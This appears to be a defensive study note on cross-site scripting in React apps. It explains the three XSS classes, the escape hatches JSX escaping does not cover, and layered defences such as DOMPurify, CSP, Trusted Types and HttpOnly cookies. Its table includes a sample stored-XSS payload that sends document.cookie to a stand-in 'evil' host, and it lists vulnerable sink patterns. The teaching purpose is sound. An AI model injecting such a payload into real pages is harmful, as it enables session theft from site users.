## TL;DR

Cross-site scripting happens when attacker-controlled data is **interpreted as code** in your origin, so it can read the DOM, call your APIs with the user's session and exfiltrate data. **Stored** XSS is saved on the server and served to other users. **Reflected** XSS bounces off the server from the request (often the URL). **DOM-based** XSS never touches the server: client JS moves data from a *source* (`location.hash`, `postMessage`) to a dangerous *sink* (`innerHTML`, `eval`). React escapes text in JSX, which removes the most common bug, but **it doesn't protect `dangerouslySetInnerHTML`, `javascript:` URLs, raw DOM access, or server-side templates**.

## The three classes

| Type | Where the payload lives | Example |
|---|---|---|
| Stored | Database (comments, profile names, filenames) | `<img src=x onerror=fetch('//evil/?c='+document.cookie)>` saved as a display name |
| Reflected | The request, echoed in the response | `/search?q=<script>…</script>` rendered unescaped by a server template |
| DOM-based | Client-side only | `el.innerHTML = decodeURIComponent(location.hash.slice(1))` |

## What React does for you

```jsx
<p>{userComment}</p>   // escaped: "<script>" shows as literal text
```

JSX text and attribute values are set as text or properties, not parsed as HTML. That covers the bulk of templating XSS.

## Where React apps still get owned

```jsx
// 1. Raw HTML sink
<div dangerouslySetInnerHTML={{ __html: post.bodyHtml }} />

// 2. URL schemes. Older React versions only warn about javascript: URLs;
//    React 19 replaces them with a blocked placeholder. Validate anyway,
//    and remember other schemes (data:) and non-React code paths.
<a href={user.website}>site</a>

// 3. Escaping the framework
ref.current.innerHTML = msg;
document.write(x); eval(x); new Function(x); setTimeout(stringArg)

// 4. SSR state injection
<script>window.__STATE__ = ${JSON.stringify(state)}</script>
//    "</script><script>…" inside state breaks out. Escape "<" as <.

// 5. Spreading untrusted props
<div {...userControlledProps} />  // could set dangerouslySetInnerHTML
```

Also: Markdown renderers that allow raw HTML, third-party widgets, and libraries that write `innerHTML` internally.

## Defence in depth

1. **Contextual output encoding** by default: React or a template engine with auto-escaping.
2. **Sanitise when you must render HTML**, using a maintained allow-list sanitiser such as DOMPurify, on the client, right before the sink. The HTML Sanitizer API (`setHTML`) is emerging in browsers but isn't universally available, so feature-detect it.
3. **Validate URLs**: allow only `https:`/`http:`/`mailto:` schemes.
4. **Content Security Policy** with nonces or hashes and `'strict-dynamic'`, without `'unsafe-inline'`, so injected markup can't run scripts.
5. **Trusted Types** (enforced via CSP) to make DOM sinks reject plain strings, which turns DOM XSS into a type error.
6. **`HttpOnly` cookies**, so XSS can't read the session cookie directly. It can still *act* as the user, so this limits damage rather than preventing the attack.
7. Treat everything as untrusted: headers, filenames, `postMessage` data (check `event.origin`), and even your own API responses.

## Pitfalls

- "We sanitise on input." Data is reused in many contexts (HTML, attributes, URLs, JS, CSS). Encode on **output**, for the specific context.
- Home-grown regex sanitisers. Browsers' parsing quirks (mutation XSS) defeat them.
- Assuming SPA = no reflected XSS. DOM XSS via the router or query params is the SPA equivalent.

## In an interview, mention…

- Source → sink thinking for DOM XSS.
- Exactly what JSX escaping covers and the five escape hatches.
- DOMPurify, CSP and Trusted Types as layers, and that HttpOnly limits but doesn't prevent impact.
- A real example: an SSR state-injection bug or a Markdown renderer allowing raw HTML.
